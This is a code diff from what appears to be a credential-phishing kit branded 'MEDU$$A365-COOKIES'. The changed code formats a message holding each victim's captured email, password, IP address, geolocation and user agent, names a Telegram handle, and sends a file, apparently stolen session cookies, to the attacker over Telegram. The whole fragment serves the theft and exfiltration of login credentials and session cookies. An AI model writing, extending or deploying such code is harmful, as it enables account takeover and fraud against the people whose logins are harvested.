@@ -527,18 +527,17 @@ if (sessionGeo) {
     locationString = `${sessionGeo.city}, ${sessionGeo.region}, ${sessionGeo.country} (${sessionIp})`;
 }
 
-const border = '═'.repeat(32);
 const caption = 
-`╔${border}╗\n` +
-`║   ⚕️🍪 MEDUSSA COOKIES ⚕️🍪   ║\n` +
-`╠${border}╣\n` +
-`║ 📧 Email: ${credentials.email.padEnd(22)} ║\n` +
-`║ 🔑 Password: ${credentials.password.padEnd(19)} ║\n` +
-`║ 🌐 IP: ${sessionIp.padEnd(26)} ║\n` +
-`║ 📍 Location: ${locationString.padEnd(20)} ║\n` +
-`║ 🖥️ User Agent: ${sessionUserAgent.padEnd(18)} ║\n` +
-`╚${border}╝\n` +
-`\n🔗 @YourTelegramUsername`;
+`==============================\n` +
+`  ⚕️🍪 MEDU$$A365-COOKIES ⚕️🍪  \n` +
+`==============================\n` +
+`📧 Email: ${credentials.email}\n` +
+`🔑 Password: ${credentials.password}\n` +
+`🌐 IP: ${sessionIp}\n` +
+`📍 Location: ${locationString}\n` +
+`🖥️ User Agent: ${sessionUserAgent}\n` +
+`==============================\n` +
+`🔗 @Kaffin_7007`;
 
     // Send document via Telegram
     sendDocumentToTelegram(filePath, caption)
